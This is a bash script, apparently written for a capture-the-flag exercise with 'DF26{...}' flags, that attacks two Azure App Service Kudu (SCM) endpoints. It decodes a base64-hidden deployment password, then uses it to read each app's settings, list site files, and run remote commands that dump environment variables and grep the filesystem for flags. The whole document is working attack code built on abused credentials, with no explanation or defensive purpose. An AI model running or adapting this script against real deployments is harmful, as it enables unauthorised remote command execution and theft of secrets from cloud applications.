#!/usr/bin/env bash
set +e
b(){ printf %s "$1"|base64 -d; }
PU='$app-tbl-reporting-prod'; PP="$(b 'WTlyY3NESFEySjFMMENvcWlraThkbFllMUFOMms4Y0hzRDF3TGxsdkxieHFTY2FNRXdSN3hrdDdZZTVB')"
for APP in app-tbl-reporting-prod app-tbl-storefront-prod; do
 H="https://$APP.scm.azurewebsites.net"; echo "APP=$APP"
 echo "SETTINGS=$(curl -sS -m 20 -u "$PU:$PP" "$H/api/settings" | head -c 2000)"
 echo "LIST=$(curl -sS -m 20 -u "$PU:$PP" "$H/api/vfs/site/wwwroot/")"
 for CMD in 'find /home/site/wwwroot -type f -maxdepth 3 -print -exec sh -c '\''grep -aHoiE "DF26\\{[^}]+\\}|flag[^[:space:]]*" "$1" 2>/dev/null'\'' _ {} \\;' 'env | sort' 'grep -RaiE "DF26\\{|flag" /home/site 2>/dev/null | head -c 10000'; do
   echo "CMD=$(curl -sS -m 40 -u "$PU:$PP" -H 'Content-Type: application/json' -X POST "$H/api/command" -d "{\"command\":\"$CMD\",\"dir\":\"/home/site/wwwroot\"}" | head -c 12000)"
 done
done